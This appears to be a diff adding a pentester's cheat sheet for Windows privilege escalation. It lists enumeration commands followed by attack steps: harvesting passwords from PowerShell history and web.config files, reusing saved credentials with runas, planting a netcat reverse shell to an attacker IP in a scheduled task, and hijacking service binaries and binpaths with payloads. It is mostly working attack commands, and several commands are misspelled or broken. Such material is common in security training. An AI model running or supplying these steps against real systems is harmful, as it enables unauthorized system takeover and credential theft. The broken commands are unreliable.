@@ -1,0 +1,164 @@
+Windows Privilege Escalation
+----------------------------
+Enumeration
+-----------
+
+
+1) System Enumeration
+=====================
+
+cmd > shell
+cmd > systeminfo
+cmd > systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
+
+cmd > hostname
+cmd > wmic logicaldisk get caption
+
+2) User Enumeration
+===================
+
+cmd > whoami
+cmd > whoami /priv
+cmd > whoami /groups
+cmd > net user
+cmd > net localgroups
+cmd > net localgroups administrator
+
+3) Network Enumeration
+======================
+
+cmd > ipconfig
+cmd > ipconfig /all
+cmd > arp -a
+cmd > route print
+cmd >netstat -ano
+
+
+4) Password Hunting
+===================
+
+cmd > findstr /si password *.txt *.ini *.config 
+
+5) AV Enumeration
+=================
+
+cmd > sc query windefend
+cmd > sc queryex type=service
+cmd > netsh adfirewall firewall dump
+cmd > netsh firewall show state
+cmd > neth firewall show config
+
+
+
+Exploit
+-------
+
+for passwords in last used commands
+===================================
+cmd > type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+
+passwords for web confing
+==========================
+cmd > type C:\Windows\Microsoft.NET\Framework64\V4.0.30319\Config\web.config | findstr connectionString
+
+(0r)
+
+cmd > type c:\inetpub\wwwroot\web.confg | findstr connectionString
+c
+
+
+stored passwords
+----------------
+cmd  > cmdkey /list
+cmd > runas /savecred /user:usernamefromabovelist cmd.exe
+after running this cmd a shell will be open of above user
+
+
+
+
+
+
+1) Kernal Exploit
+=================
+
+cmd > whoami 
+cmd > sysinfo    --> copy all the text and store t in a file sysinfo.txt and go to attacker machine and run 
+cmd >  ./windows-exploit-suggester.py --database 2020-04017-mssb.xls --systeminfo sysinfo.txt
+
+
+2) Token Impersonation 
+======================
+
+cmd > whoami /priv
+cmd > getprivs   == > in meterpreter
+cmd >
+
+
+3) using sch tasks
+==================
+
+cmd > schtasks /query /fo LIST /v
+cmd > schtasks /query /tn vulntask /fo list /v
+look at op and see task to run and run as user and look at permissions and modify to get shell
+cmd > icacls C:\tasks\taskname.bat
+now add the payload 
+cmd > echo c:\tols\nc64.exe -e cmd.exe attackerip port > C:\tasks\schtask.bat
+now run the task
+cmd > schtasks /run /tn vulntask
+ 
+
+
+
+4) Abusing service Misconfiguration
+===================================
+to list services
+cmd > Tasklist /svc
+cmd > wmic service get name,displayname,pathname,startmode
+
+to view details of specific service
+cmd > sc qc service-name
+cmd > sc qc windowsScheduler
+look at binary path name and service start name to know path and who will run the service(admin or user)
+
+to check permisions
+cmd > icacls C:\path\to\binary.exe
+
+and if you find it can be modified by everyone(M) write payload into exe and execute service to get shell
+first backup the originalservice
+cmd > mv targetservice.exe targetservice.exe.bkp
+next copy payloa to original service
+cmd > move C:\Payload.exe targetservice.exe
+now give full access to everyone to targetservice
+cmd > icacls targetservice.exe /grant Everyone:F
+now restart the service
+cmd > sc stop targetservicename
+cmd > sc start targetservicename
+
+
+5) Unquoted service Path
+========================
+to  list services
+cmd > wmic service get name,displayname,pathname,startmode
+look for service without quotes so create new exe in the name of unquoted path and grant it full access to everyone and re start the service
+
+6) Insecure service permissions
+===============================
+cmd > look for a service which have permission of read write for all users and then lookat the service on whom its running weather it is admin or user, if t is running by admin check for the configuration to know weather we can config the binary path if we have change the service binary path to payload and then restart the service
+
+cmd > accesschk /acceptula -uvqwc user * 
+cmd > accesschk /acceptula -uvqwc user * RW servicename
+to know who is running
+cmd > sc qc servicename
+check service start name and if it is admin/system then full privilages
+now check for the configuration
+cmd > sc config servicename
+now change the binary path and then restart the service
+cmd > sc confing servicename binpath=\C:\path\to\Payload.exe
+cmd > sc qc servicename
+now restart
+cmd > net start servicename
+
+
+
+
+
